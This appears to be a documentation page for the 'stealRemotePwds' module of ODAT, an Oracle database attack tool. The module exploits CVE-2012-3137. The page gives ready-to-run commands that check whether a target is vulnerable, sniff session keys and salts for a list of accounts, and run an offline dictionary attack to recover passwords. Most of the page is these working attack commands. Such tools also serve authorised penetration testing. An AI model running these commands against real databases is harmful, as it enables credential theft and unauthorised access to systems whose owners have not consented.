# Exploit CVE-2012-3137

This module allows you to exploit the [CVE-2012-3137](http://www.cvedetails.com/cve/CVE-2012-3137/) vulnerability easily.

__Note__: Need *root* privileges in order to sniff session keys and salts from the network.

* To test if the remote database is vulnerable:
```bash
sudo ./odat.py stealRemotePwds -s $SERVER -d $ID -U $USER -P $PASSWORD --test-module
```

With the previous command, ODAT tries to get the session key and salt. If it has these 2 values for the user given in command line (i.e. $USER), ODAT will try to decrypt the session key with your password given in command line (i.e. $PASSWORD). If the session id (value decrypted) starts with '\x08\x08\x08\x08\x08\x08\x08\x08', the password given (i.e. $PASSWORD) for this user (i.e. $USER) is valid: The target database is vulnerable to this CVE-2012-3137.

* To get session keys and salts of users stored in the *accounts_small.txt* file:
```bash
sudo ./odat.py stealRemotePwds -s $SERVER -d $ID --user-list accounts_small.txt --get-all-passwords
```

* To do a dictionary attack on session keys and salts:
```bash
sudo chmod o+r sessions-$SERVER-1521-$SID.txt; ./odat.py stealRemotePwds -s $SERVER -d $SID --decrypt-sessions sessions-$SERVER-1521-$SID.txt test.txt
```